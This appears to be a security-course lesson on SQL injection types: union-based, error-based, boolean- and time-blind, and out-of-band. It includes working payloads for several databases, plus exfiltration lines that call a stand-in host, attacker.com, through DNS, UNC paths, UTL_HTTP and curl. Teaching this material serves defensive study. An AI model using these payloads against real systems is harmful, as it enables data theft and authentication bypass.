# SQL Injection Types

## Unit 5: SQL Injection — Topic 1

## 🎯 Overview

SQL injection (SQLi) is one of the most dangerous web vulnerabilities, allowing attackers to manipulate database queries by injecting malicious SQL code through user input. It can lead to data theft, authentication bypass, data modification, and even remote code execution. This topic covers the three main categories: In-Band, Blind, and Out-of-Band SQL injection.

---

## 1. SQL Injection Categories

```
┌──────────────────────────────────────────────────────────────┐
│              SQL INJECTION TAXONOMY                           │
├──────────────────────────────────────────────────────────────┤
│                                                              │
│  ┌─────────────────────────────────────────────┐            │
│  │  IN-BAND (Classic)                          │            │
│  │  ├── Union-Based: Data returned in response │            │
│  │  └── Error-Based: Data in error messages    │            │
│  └─────────────────────────────────────────────┘            │
│                                                              │
│  ┌─────────────────────────────────────────────┐            │
│  │  BLIND                                      │            │
│  │  ├── Boolean-Based: True/false responses    │            │
│  │  └── Time-Based: Response delay             │            │
│  └─────────────────────────────────────────────┘            │
│                                                              │
│  ┌─────────────────────────────────────────────┐            │
│  │  OUT-OF-BAND                                │            │
│  │  └── Data sent via DNS/HTTP to attacker     │            │
│  └─────────────────────────────────────────────┘            │
└──────────────────────────────────────────────────────────────┘
```

---

## 2. Union-Based SQL Injection

```
┌──────────────────────────────────────────────────────────────┐
│  Original Query:                                              │
│  SELECT name, email FROM users WHERE id = '1'                │
│                                                              │
│  Injected:                                                    │
│  SELECT name, email FROM users WHERE id = '1'                │
│  UNION SELECT username, password FROM admin_users-- '        │
│                                                              │
│  Result: Returns normal data + admin credentials!            │
└──────────────────────────────────────────────────────────────┘
```

```bash
# Step 1: Determine number of columns
GET /page?id=1 ORDER BY 1--    # OK
GET /page?id=1 ORDER BY 2--    # OK
GET /page?id=1 ORDER BY 3--    # OK
GET /page?id=1 ORDER BY 4--    # Error → 3 columns

# Step 2: Find visible columns
GET /page?id=1 UNION SELECT 1,2,3--
# Page displays "2" and "3" → columns 2 and 3 are visible

# Step 3: Extract data
GET /page?id=1 UNION SELECT 1,version(),database()--
GET /page?id=1 UNION SELECT 1,table_name,3 FROM information_schema.tables--
GET /page?id=1 UNION SELECT 1,username,password FROM users--
```

---

## 3. Error-Based SQL Injection

```bash
# MySQL error-based
GET /page?id=1' AND extractvalue(1,concat(0x7e,version()))--
# Error: XPATH syntax error: '~5.7.34'

GET /page?id=1' AND updatexml(1,concat(0x7e,version()),1)--
# Error: XPATH syntax error: '~5.7.34'

# MSSQL error-based
GET /page?id=1' AND 1=CONVERT(int,(SELECT @@version))--
# Error: Conversion failed when converting 'Microsoft SQL Server 2019'

# PostgreSQL error-based
GET /page?id=1' AND 1=CAST(version() AS int)--
# Error: invalid input syntax for integer: "PostgreSQL 14.5"
```

---

## 4. Boolean-Based Blind SQL Injection

```
┌──────────────────────────────────────────────────────────────┐
│              BOOLEAN-BASED BLIND SQLi                         │
├──────────────────────────────────────────────────────────────┤
│                                                              │
│  True Condition (page loads normally):                        │
│  GET /page?id=1 AND 1=1--                                    │
│  → Normal page displayed                                     │
│                                                              │
│  False Condition (page changes):                             │
│  GET /page?id=1 AND 1=2--                                    │
│  → Different/empty page displayed                            │
│                                                              │
│  Extract data character by character:                        │
│  GET /page?id=1 AND SUBSTRING(version(),1,1)='5'--          │
│  → True (normal page) → first char is '5'                   │
│                                                              │
│  GET /page?id=1 AND SUBSTRING(version(),2,1)='.'--          │
│  → True → second char is '.'                                │
│                                                              │
│  Slow but works when no data is returned in response!        │
└──────────────────────────────────────────────────────────────┘
```

---

## 5. Time-Based Blind SQL Injection

```bash
# MySQL
GET /page?id=1' AND SLEEP(5)--
# Response delayed 5 seconds → vulnerable!

GET /page?id=1' AND IF(SUBSTRING(version(),1,1)='5',SLEEP(5),0)--
# 5 second delay → first char is '5'
# No delay → first char is NOT '5'

# MSSQL
GET /page?id=1'; WAITFOR DELAY '0:0:5'--

# PostgreSQL
GET /page?id=1'; SELECT pg_sleep(5)--

# Oracle
GET /page?id=1' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5)--
```

---

## 6. Out-of-Band SQL Injection

```bash
# When no in-band or blind feedback is available
# Requires server to make outbound connections

# MySQL (requires FILE privilege)
SELECT LOAD_FILE(CONCAT('\\\\',version(),'.attacker.com\\share'));
# DNS query: 5.7.34.attacker.com → captured by attacker's DNS

# MSSQL (xp_dirtree or xp_cmdshell)
EXEC master..xp_dirtree '\\attacker.com\share'

# Oracle (UTL_HTTP)
SELECT UTL_HTTP.REQUEST('http://attacker.com/'||version()) FROM dual;

# PostgreSQL (COPY)
COPY (SELECT version()) TO PROGRAM 'curl http://attacker.com/';
```

---

## 7. Database-Specific Syntax

| Feature | MySQL | MSSQL | PostgreSQL | Oracle |
|---------|-------|-------|-----------|--------|
| Comment | `--` or `#` | `--` | `--` | `--` |
| String concat | `CONCAT()` | `+` | `\|\|` | `\|\|` |
| Version | `version()` | `@@version` | `version()` | `v$version` |
| Current DB | `database()` | `db_name()` | `current_database()` | `SYS.DATABASE_NAME` |
| Sleep | `SLEEP(5)` | `WAITFOR DELAY` | `pg_sleep(5)` | `DBMS_PIPE` |
| Schema enum | `information_schema` | `information_schema` | `information_schema` | `ALL_TABLES` |

---

## 📊 Summary Table

| Type | Data Return | Speed | Difficulty | Detection |
|------|-----------|-------|-----------|-----------|
| Union-Based | Direct in response | Fast | Easy | Easy |
| Error-Based | In error messages | Fast | Medium | Easy |
| Boolean Blind | True/false inference | Slow | Medium | Hard |
| Time-Based | Timing inference | Very slow | Hard | Hard |
| Out-of-Band | External channel | Fast | Hard | Hard |

---

## ❓ Revision Questions

1. What are the three main categories of SQL injection?
2. How do you determine the number of columns for a UNION-based attack?
3. How does boolean-based blind SQL injection extract data?
4. What is the key difference between time-based and boolean-based blind SQLi?
5. When is out-of-band SQL injection preferred over other types?
6. How does the SQL syntax differ between MySQL, MSSQL, and PostgreSQL?

---

*Next: [02-detection-techniques.md](02-detection-techniques.md)*

---

*[Back to README](../README.md)*
